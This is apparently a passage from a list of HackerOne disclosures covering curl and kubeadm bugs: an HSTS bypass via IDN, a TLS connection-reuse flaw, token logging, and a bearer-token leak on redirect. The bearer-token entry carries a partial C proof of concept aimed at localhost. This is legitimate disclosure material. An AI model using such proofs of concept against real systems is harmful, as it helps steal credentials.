$ ls -la hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.txt 
-rw-r--r-- 1 cx cx 0 Nov  1 19:17 hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.hsts.txt
```

## 64. [#3621851](https://hackerone.com/reports/3621851)  -  CVE-2026-4873: connection reuse ignores TLS requirement
*low*

```bash
python3 ./server.py --port 2525
```

## 65. [#972561](https://hackerone.com/reports/972561)  -  kubeadm logs tokens before deleting them
*low*

```go
deleteCmd := &cobra.Command{
		Use:                   "delete [token-value] ...",
		DisableFlagsInUseLine: true,
		Short:                 "Delete bootstrap tokens on the server",
		Long: dedent.Dedent(`
			This command will delete a list of bootstrap tokens for you.

			The [token-value] is the full Token of the form "[a-z0-9]{6}.[a-z0-9]{16}" or the
			Token ID of the form "[a-z0-9]{6}" to delete.
		`),
		RunE: func(tokenCmd *cobra.Command, args []string) error {
			if len(args) < 1 {
				return errors.Errorf("missing subcommand; 'token delete' is missing token of form %q", bootstrapapi.BootstrapTokenIDPattern)
			}
			kubeConfigFile = cmdutil.GetKubeConfigPath(kubeConfigFile)
			client, err := getClientset(kubeConfigFile, dryRun)
			if err != nil {
				return err
			}

			return RunDeleteTokens(out, client, args)
		},
	}
```

## 66. [#1730660](https://hackerone.com/reports/1730660)  -  CVE-2022-42916: HSTS bypass via IDN
*medium*

```
# curl -v --hsts hsts.txt http://accounts.google.com
* Switched from HTTP to HTTPS due to HSTS => https://accounts.google.com/
*   Trying 142.250.196.141:443...
* Connected to accounts.google.com (142.250.196.141) port 443 (#0)
* ALPN: offers h2
* ALPN: offers http/1.1
*  CAfile: /etc/ssl/certs/ca-certificates.crt
*  CApath: /etc/ssl/certs
* TLSv1.0 (OUT), TLS header, Certificate Status (22):
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.2 (IN), TLS header, Certificate Status (22):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS header, Finished (20):
* TLSv1.2 (IN), TLS header, Supplemental data (23):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.2 (OUT), TLS header, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS header, Supplemental data (23):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* ALPN: server accepted h2
* Server certificate:
*  subject: CN=accounts.google.com
*  start date: Sep 12 08:19:34 2022 GMT
*  expire date: Dec  5 08:19:33 2022 GMT
*  subjectAltName: host "accounts.google.com" matched cert's "accounts.google.com"
*  issuer: C=US; O=Google Trust Services LLC; CN=GTS CA 1C3
*  SSL certificate verify ok.
* Using HTTP2, server supports multiplexing
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* TLSv1.2 (OUT), TLS header, Supplemental data (23):
* TLSv1.2 (OUT), TLS header, Supplemental data (23):
# … truncated …
```

## 67. [#3459417](https://hackerone.com/reports/3459417)  -  CVE-2025-14524: bearer token leak on cross-protocol redirect
*low*

```c
#include <stdio.h>
#include <curl/curl.h>

int main(void) {
    CURL *curl;
    const char *secret_token = "MY_SECRET_GOLDEN_TICKET";

    printf("--- PoC V4: OAuth2 Bearer Token Leak on Redirect ---\n");

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();

    if(curl) {
        // 1. URL HTTP initiale
        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8080/resource");

        // 2. Configuration du Token
        curl_easy_setopt(curl, CURLOPT_XOAUTH2_BEARER, secret_token);
        
        // 3. On met un user initial (optionnel, mais réaliste)
        curl_easy_setopt(curl, CURLOPT_USERNAME, "initial_user");

        // 4. Autoriser la redirection
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        // On autorise explicitement IMAP car les versions récentes de curl
        // sont restrictives sur les protocoles par défaut.
        curl_easy_setopt(curl, CURLOPT_REDIR_PROTOCOLS_STR, "http,https,imap");

        // 5. IMPORTANT : On n'active PAS CURLOPT_UNRESTRICTED_AUTH.
        // Le but est de prouver que le token fuite MÊME quand curl essaie de sécuriser les identifiants.

        // Debug
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

        printf("[*] Sending request...\n");
# … truncated …
```
